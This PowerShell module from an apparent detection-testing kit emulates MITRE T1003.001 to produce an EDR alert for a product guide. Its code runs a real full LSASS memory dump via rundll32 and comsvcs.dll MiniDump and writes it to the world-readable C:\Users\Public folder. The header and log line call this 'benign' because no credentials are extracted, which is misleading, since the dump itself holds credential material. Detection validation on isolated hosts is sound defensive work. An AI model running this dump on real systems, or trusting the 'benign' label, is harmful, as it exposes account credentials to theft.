# ============================================================================
# Stage2-CredentialAccess.ps1   (GUARDED MODULE - benign signal + reference)
# MITRE: T1003.001 OS Credential Dumping - LSASS Memory
# ----------------------------------------------------------------------------
# What this module does:
#   * Uses comsvcs.dll to dump lsass to disk. This simulation does not try to extract any credentials.
#
# OTHER WAYS TO GENERATE THE REAL DETECTION (operator runs this, not this script):
#   Use the maintained Atomic Red Team test for T1003.001 on the isolated,
#   snapshotted POC-Visibility host, then revert the snapshot:
#     Invoke-AtomicTest T1003.001                # list tests
#     Invoke-AtomicTest T1003.001 -TestNumbers 1 # run one, e.g. procdump path
#   See: https://github.com/redcanaryco/atomic-red-team (T1003.001)
#
# Expected CBX result to capture for the guide:
#   * A Credential Access alert for suspicious access to lsass.exe memory
#     (guide 7.2 triage by ATT&CK tactic; 8.2 process analysis of the tool).
#   * The tool process appears in the same investigation / Threat Tracer graph.
#
# Cleanup: whatever the Atomic test drops (e.g. a dump file) is removed by that
# test's cleanup and by reverting the snapshot; Cleanup-Target1.ps1 also sweeps
# the dump-file locations the original kit used, as a backstop.
# ============================================================================

if (-not (Get-Command Write-Step -ErrorAction SilentlyContinue)) {
    function Write-Step($m){ Write-Host "[$((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))] $m" -ForegroundColor Yellow }
    function Write-Stage($t){ Write-Host "`n==== $t  START $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))" -ForegroundColor Cyan }
    function Write-StageEnd($t){ Write-Host "==== $t  END   $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss.fff'))`n" -ForegroundColor Cyan }
    function Write-Info($m){ Write-Host "        $m" -ForegroundColor DarkGray }
}

Write-Stage "STAGE 2 - CREDENTIAL ACCESS (LSASS memory dump)"

$dumpPath = 'C:\Users\Public\lsass.dmp'
Write-Step "T1003.001  LSASS MiniDump via comsvcs.dll -> $dumpPath"
$p = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump $p $dumpPath full
Write-Info "wrote $dumpPath (benign: dump only, no credential extraction)"

Write-StageEnd "STAGE 2 - CREDENTIAL ACCESS"